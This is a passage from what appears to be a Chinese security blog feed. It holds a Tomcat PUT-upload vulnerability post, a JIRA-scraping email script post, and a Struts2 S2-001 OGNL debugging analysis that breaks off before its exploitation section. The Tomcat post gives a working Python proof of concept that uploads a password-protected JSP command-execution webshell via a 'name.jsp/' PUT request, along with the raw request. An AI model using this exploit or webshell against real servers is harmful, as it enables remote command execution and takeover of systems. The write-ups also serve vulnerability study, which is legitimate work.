src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw93l0dge4j30xh0boacu.jpg" alt=""></p><p><strong> payload2(可攻击Tomcat 7.0.81)：</strong></p><p>思路：可以上传jSp文件(但不能解析)，却不可上传jsp。 说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 test.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。</p><blockquote><p>PUT /222.jsp/ HTTP/1.1<br>Host: 127.0.0.1:8080<br>User-Agent: JNTASS<br>DNT: 1<br>Connection: close<br>…jsp shell…</p></blockquote><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fw93m11152j30xj0c4mzn.jpg" alt=""></p><h2 id="3-写入成功"><a href="#3-写入成功" class="headerlink" title="3. 写入成功"></a>3. 写入成功</h2><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw93mf5mmpj310w08g3zb.jpg" alt=""></p><h2 id="4-POC参考-猎户实验室"><a href="#4-POC参考-猎户实验室" class="headerlink" title="4. POC参考(猎户实验室)"></a>4. POC参考(猎户实验室)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">body = <span class="string">'''&lt;%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span></span><br><span class="line"><span class="string">+"\\n");&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if("023".equals(request.getParameter("pwd"))&amp;&amp;!"".equals(request.getParameter("cmd")))&#123;out.println("&lt;pre&gt;"+excuteCmd(request.getParameter("cmd"))+"&lt;/pre&gt;");&#125;else&#123;out.println(":-)");&#125;%&gt;'''</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line">    conn.request(method=<span class="string">'OPTIONS'</span>, url=<span class="string">'/ffffzz'</span>)</span><br><span class="line">    headers = dict(conn.getresponse().getheaders())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'allow'</span> <span class="keyword">in</span> headers <span class="keyword">and</span> \</span><br><span class="line">       headers[<span class="string">'allow'</span>].find(<span class="string">'PUT'</span>) &gt; <span class="number">0</span> :</span><br><span class="line">        conn.close()</span><br><span class="line">        conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line">        url = <span class="string">"/"</span> + str(int(time.time()))+<span class="string">'.jsp/'</span></span><br><span class="line">        <span class="comment">#url = "/" + str(int(time.time()))+'.jsp::$DATA'</span></span><br><span class="line">        conn.request( method=<span class="string">'PUT'</span>, url= url, body=body)</span><br><span class="line">        res = conn.getresponse()</span><br><span class="line">        <span class="keyword">if</span> res.status  == <span class="number">201</span> :</span><br><span class="line">            <span class="comment">#print 'shell:', 'http://' + sys.argv[1] + url[:-7]</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'shell:'</span>, <span class="string">'http://'</span> + sys.argv[<span class="number">1</span>] + url[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">elif</span> res.status == <span class="number">204</span> :</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'file exists'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'error'</span></span><br><span class="line">        conn.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Server not vulnerable'</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">except</span> Exception,e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error:'</span>, e</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 远程代码执行漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>提取JIRA中的信息并发送指定邮件</title>
      <link href="/%E6%8F%90%E5%8F%96JIRA%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B9%B6%E5%8F%91%E9%80%81%E6%8C%87%E5%AE%9A%E9%82%AE%E4%BB%B6/"/>
      <url>/%E6%8F%90%E5%8F%96JIRA%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B9%B6%E5%8F%91%E9%80%81%E6%8C%87%E5%AE%9A%E9%82%AE%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><script type="text/javascript" src="/js/src/bai.js"></script><h2 id="1-前沿"><a href="#1-前沿" class="headerlink" title="1. 前沿"></a>1. 前沿</h2><p>近期需要把业务系统中的一些内容详情拷贝出来，并发送到指定邮箱，虽然内容不是很多，但是搞着搞着实在有点麻烦，就考虑着写一个脚本来获取JIRA系统中的信息，并实现自动发送邮件功能。功能并不是很强大，只是满足了一点小小需求。</p><h2 id="2-实现过程"><a href="#2-实现过程" class="headerlink" title="2.实现过程"></a>2.实现过程</h2><h3 id="2-1-模拟用户信息登录"><a href="#2-1-模拟用户信息登录" class="headerlink" title="2.1 模拟用户信息登录"></a>2.1 模拟用户信息登录</h3><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fw2ya3y716j31da0rkq5v.jpg" alt=""></p><p>首先我们需要先模拟登录我们JIRA的系统，这里引用的是cookielib模块。它的主要作用是提供可存储cookie的对象，以便于与urllib2模块配合使用来访问Internet资源。</p><p>将cookie保存到变量中，利用CookieJar对象实现获取cookie的功能</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw2e27te3yj31kw0m744o.jpg" alt=""></p><p>其中opener.open可以理解成urllib2的urlopen就可以了。这样我们就可以保留cookie进行其他页面的操作</p><h3 id="2-2-获取每一个页面的详情信息"><a href="#2-2-获取每一个页面的详情信息" class="headerlink" title="2.2 获取每一个页面的详情信息"></a>2.2 获取每一个页面的详情信息</h3><p>使用PyQuery解析页面，提取所有页面漏洞的url，循环遍历出来</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fw22rv3xqsj31kw0s014f.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fw2dtk4k2tj314o09cta9.jpg" alt=""></p><p>然后解析提取的每一个url地址，根据漏洞详情页面的selector，获取页面不同节点的信息</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw2dzvj162j31kw0py0za.jpg" alt=""></p><h3 id="2-3-输出文件"><a href="#2-3-输出文件" class="headerlink" title="2.3 输出文件"></a>2.3 输出文件</h3><p>将我们提取出来的结果，保存成txt文件</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw2e4z31dej316y064dgu.jpg" alt=""></p><h3 id="2-4-将漏洞的详情信息发送到指定邮箱"><a href="#2-4-将漏洞的详情信息发送到指定邮箱" class="headerlink" title="2.4 将漏洞的详情信息发送到指定邮箱"></a>2.4 将漏洞的详情信息发送到指定邮箱</h3><p>将页面的漏洞名称、漏洞地址、漏洞等级、开发负责人等信息提取出来，发送给指定负责人</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw2eg4j69tj318a0lgwj3.jpg" alt=""></p><h2 id="3-效果如下"><a href="#3-效果如下" class="headerlink" title="3.效果如下"></a>3.效果如下</h2><p>将每个漏洞的详情状态发送到指定邮箱，这里用自己邮箱测试一下</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw2enc93bej31kw0twx0w.jpg" alt=""></p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw2fkw9ar0j30zw0du414.jpg" alt=""></p><h2 id="4-脚本地址"><a href="#4-脚本地址" class="headerlink" title="4.脚本地址"></a>4.脚本地址</h2><p><strong><a href="https://github.com/SQYY/JiraInfo" target="_blank" rel="noopener">https://github.com/SQYY/JiraInfo</a></strong></p><p>代码结构有点糙，只是为了满足当前的需求，也没有进行太多完善，有很多差强人意的地方。</p>]]></content>
      
      <categories>
          
          <category> 脚本编写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts-001远程代码执行漏洞分析</title>
      <link href="/Struts-001%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Struts-001%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h2><p><strong>官方链接</strong>：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p><p><strong>官方概述</strong>：Remote code exploit on form validation error</p><p><strong>影响版本</strong>：WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p><p><strong>修复摘要</strong>：数据 re-display 时禁止执行 OGNL 表达式</p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h2><p>  Struts2框架表单的验证机制(Validation)主要依赖于两个拦截器：<code>Validation</code>和<code>workflow</code>，在默认配置下，如果用户所提交的表单验证出错不会跳转到新的页面，而是在后端OGNL表达式会解析处理传入字段的内容，从而执行payload。</p><h2 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h2><p><strong>下载 Struts2.0.1</strong>：<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.11.1-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip</a></p><h3 id="3-1-目录结构"><a href="#3-1-目录结构" class="headerlink" title="3.1 目录结构"></a>3.1 <strong>目录结构</strong></h3><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu2s8jk7i1j30h60pwq5n.jpg" alt=""></p><h3 id="3-2-引用的包"><a href="#3-2-引用的包" class="headerlink" title="3.2 引用的包"></a>3.2 <strong>引用的包</strong></h3><ul><li>commons-logging-1.0.4.jar</li><li>freemarker-2.3.4.jar</li><li>ognl-2.6.7.jar</li><li>struts2-api-2.0.1.jar</li><li>struts2-core-2.0.1.jar</li><li>xwork-2.0-beta-1.jar</li></ul><h3 id="3-3-相关文件"><a href="#3-3-相关文件" class="headerlink" title="3.3 相关文件"></a>3.3 <strong>相关文件</strong></h3><p><strong>index.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">&lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>welcome.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>struts.xml</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">    <span class="string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line">    <span class="string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">"S2-001"</span> extends=<span class="string">"struts-default"</span>&gt;</span><br><span class="line">&lt;action name=<span class="string">"login"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span><br><span class="line">&lt;result name="success"&gt;welcome.jsp&lt;/result&gt;</span><br><span class="line">&lt;result name="error"&gt;index.jsp&lt;/result&gt;</span><br><span class="line">&lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure></p><p><strong>com.demo.action.LoginAction.java</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.password = password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">&amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>web.xml</strong><br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> xsi:schemaLocation=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> id=<span class="string">"WebApp_ID"</span> version=<span class="string">"3.1"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;display-name&gt;S2-001 Example&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">apache</span>.<span class="title">struts2</span>.<span class="title">dispatcher</span>.<span class="title">FilterDispatcher</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">struts2</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">welcome</span>-<span class="title">file</span>&gt;<span class="title">index</span>.<span class="title">jsp</span>&lt;/<span class="title">welcome</span>-<span class="title">file</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">web</span>-<span class="title">app</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h2><p>Struts2标签库提供了主题、模板支持，极大地简化了视图页面的编写。而且struts2的主题、模板都提供了很好的扩展性，实现了更好的代码复用。</p><p>Struts2允许在页面中使用自定义组件，这完全能满足项目中页面显示复杂，多变的需求。</p><p>使用struts2的标签的jsp页面，需要头声明：&lt;%@ taglib prefix=”s” uri=”/struts-tags” %&gt;</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu05k494dhj312803cgmf.jpg" alt=""></p><p>而在<code>Struts2-core</code>核心包的<code>META-INF/struts-tags.tld</code>中，里面定义了各个标签的属性以及处理类等内容</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu2nn6y3ksj31kw0ghq6l.jpg" alt=""></p><p>标签中的具体实现类<code>struts2-core-2.0.1.jar!/org/apache/struts2/views/jsp/URLTag.class</code>,继承了<code>ComponentTagSupport</code>类，里面包含了很多公共的属性，同时URLTag也定义了自己的属性，action,value,escapeAmp等，与配置文件相呼应。 </p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu2nr558t2j31hu0o079i.jpg" alt=""></p><p>而URL标签是依靠URLTag类实现的，它继承的ComponentTagSupport组件</p><p>其实标签实际上是继承了<code>http servlet</code>中可扩展的<code>StrutsBodyTagSupport</code>类。然后会依次执行以下方法：</p><blockquote><p>doStartTag()<br>  doEndTag()</p></blockquote><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu2o53vcrjj31kw0pjwju.jpg" alt=""></p><p>回到<code>struts.xml</code>文件中，<code>params</code>拦截器是用于设置action上的请求参数,默认被调用的，拦截器主要作用是在调用action之前提供预处理逻辑。</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu2ommwqvoj31600igjzn.jpg" alt=""></p><p>所以我们进入到<code>xwork-2.0.1.jar!com/opensymphony/xwork2/interceptor/ParametersInterceptor</code>中，如下图标记处所示，此处表示接受我们传入的参数值，并调用此方法，因此我们从此处打断点调试</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu2owpc3gpj31kw0ceaf8.jpg" alt=""></p><p>执行到这里，跟进<code>invocation.invoke()</code><br><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu2p23psewj31bq03g74w.jpg" alt=""></p><p>会进入到<code>xwork-2.0.1.jar!com/opensymphony/xwork2/DefaultActionInvocation</code></p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu069qpqb0j31kw037dgl.jpg" alt=""></p><p>跟进<code>executeResult()</code></p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fu2p8enolmj31kw0iktdv.jpg" alt=""></p><p>经过多次步入，会步入到<code>struts2-core-2.0.1.jar!org/apache/struts2/dispatcher/ServletDisatcherResult.class</code></p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fu2dauinnzj31kw0qfdna.jpg" alt=""></p><p>继续跟进会来到<br><code>struts2-core-2.0.1.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class</code></p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1dzsg4vnj31kw0aqq5a.jpg" alt=""></p><p>这里会对jsp标签<code>&lt;s:textfield name=&quot;username&quot; label=&quot;username&quot; /&gt;</code>进行解析，首先会执行<code>doStartTag()</code>方法，其中<code>getBean()</code>方法是获取到url组件，然后将组件插入到XWork容器中进行维护，<code>populateParams()</code>是将获取url组件中的属性赋值，这一部分也是执行渲染ur前的准备工作，执行后回到<code>index.jsp</code>。<br><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1dbyvqgaj31a805mjsc.jpg" alt=""></p><p>当遇到闭合标签<code>/&gt;</code>后，会执行<code>doEndTag()</code>，只有执行<code>doEndTag()</code>后Payload才可以执行，这里主要执行组件的自定义方法为<code>end</code>方法</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu2ra7zy2fj31kw05d75q.jpg" alt=""></p><p>跟进<code>compoent.end</code>，这里主要是对url标签进行渲染<br><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fu1e668zrvj31kw0ehdj3.jpg" alt=""></p><p>继续跟进<code>evaluateParams()</code>,遍历标签的属性，获取标签的各项属性值。</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1gtyl5rtj31i00ds417.jpg" alt=""></p><p>继续执行，可以看到<code>altSyntax()</code>，它是Struts 2 框架处理标签内容的一种语法，主要对标签中的 OGNL 表达式进行解析并执行。而<code>altSyntax()</code>在处理标签时，对OGNL 表达式的解析能力实际上是依赖于开源组件XWork，如果altSyntax功能开启,在赋值时使用<code>%{}</code>括起来，这个表达式就会求值</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu1j5vpexqj31kw0cpdip.jpg" alt=""></p><p><code>addParameter()</code>是查询并添加结果至参数列表，其中查询的语句是<code>%{username}</code></p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1hzkmcgej31kw0ikwir.jpg" alt=""></p><p>继续跟进，会进入到<code>struts2-core-2.0.1.jar!/org/apache/struts2/components/Component</code>的<code>findValu()</code>方法，如果开启<code>altSyntax()</code>会进入到<code>TextParseUtil.translateVariables</code>对表达式进行解析</p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fu1jl64vn7j31kw0c041q.jpg" alt=""></p><p>继续跟进<code>TextParseUtil.translateVariables</code>,<code>xwork-2.0.1.jar!/com/opensymphony/xwork2/util/TextParseUtil.class</code></p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1jpzpea6j31kw032dh3.jpg" alt=""></p><p>往下执行可以看到，表达式为<code>%{username}</code><br><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu1ke0f3jij31kw06vq5d.jpg" alt=""></p><p>经过while循环，确定start和end定位后，此时<code>var</code>为<code>username</code>,并赋值标签值o，进入OGNL表达式，再赋值给<code>result</code><br><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fu1ktaopr2j31kw0gcgq4.jpg" alt=""></p><p>此时<code>%{1+1}</code>就是我们传入的payload<br><code>xwork-2.0.1.jar!com/opensymphony/xwork2/util/OgnlValueStack.class</code></p><p>递归解析表达式，也就是说最终 Payload 将变为 1+1，进入 OGNL 最终得以执行！</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fu2f41iie3j31kw0v5k3x.jpg" alt=""></p><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" 